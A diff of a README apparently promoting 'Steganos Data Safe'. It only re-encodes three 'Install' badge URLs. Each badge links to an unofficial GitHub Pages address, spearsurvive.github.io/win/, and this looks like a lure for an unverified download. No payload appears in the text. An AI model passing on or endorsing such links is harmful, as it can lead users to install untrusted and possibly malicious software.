@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Steganos Data Safe](https://img.shields.io/badge/⬇_Install_Steganos%20Data%20Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos Data Safe](https://img.shields.io/badge/⬇_Install_Steganos+Data+Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Steganos Data Safe creates encrypted virtual safes on your computer or cloud sto
 
 <div align="center">
 
-[![⬇ Install Steganos Data Safe](https://img.shields.io/badge/⬇_Install_Steganos%20Data%20Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos Data Safe](https://img.shields.io/badge/⬇_Install_Steganos+Data+Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Steganos Data Safe creates encrypted virtual safes on your computer or cloud sto
 
 <div align="center">
 
-[![⬇ Install Steganos Data Safe](https://img.shields.io/badge/⬇_Install_Steganos%20Data%20Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Steganos Data Safe](https://img.shields.io/badge/⬇_Install_Steganos+Data+Safe-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
